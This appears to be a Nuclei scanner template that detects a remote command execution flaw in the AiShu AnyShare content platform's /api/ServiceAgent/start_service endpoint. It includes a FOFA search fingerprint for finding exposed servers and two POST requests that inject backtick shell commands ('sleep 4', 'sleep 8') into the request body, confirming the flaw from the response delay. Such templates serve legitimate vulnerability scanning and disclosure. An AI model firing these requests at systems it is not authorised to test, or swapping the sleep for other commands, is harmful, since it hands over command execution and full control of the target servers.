id: AiShu-AnyShare-ZhiNengNeiRongGuanLiPingTai-start_service-RCE

info:
  name: 爱数 AnyShare /api/ServiceAgent/start_service 远程命令执行
  author: HuanXiong
  severity: critical
  description: |-
    fofa: body="/libs/hls.js/dist/hls.min.js"
    爱数 AnyShare智能内容管理平台存在远程命令执行漏洞，攻击者可通过构造恶意HTTP请求，利用 /api/ServiceAgent/start_service 接口触发漏洞，执行任意系统命令，进而获取服务器系统权限，危害系统安全。
  reference:
    - 
  tags: rce, aishu, anyshare

http:
  - raw:
      - |-
        POST /api/ServiceAgent/start_service HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36

        ["`sleep 4`"]

      - |-
        POST /api/ServiceAgent/start_service HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
        Accept: */*
        Connection: keep-alive

        ["`sleep 8`"]

    matchers:
      - type: dsl
        name: 远程命令执行
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200 && duration_1 >= 4 && duration_1 <= 5 && duration_2 >= 8 && duration_2 <= 9"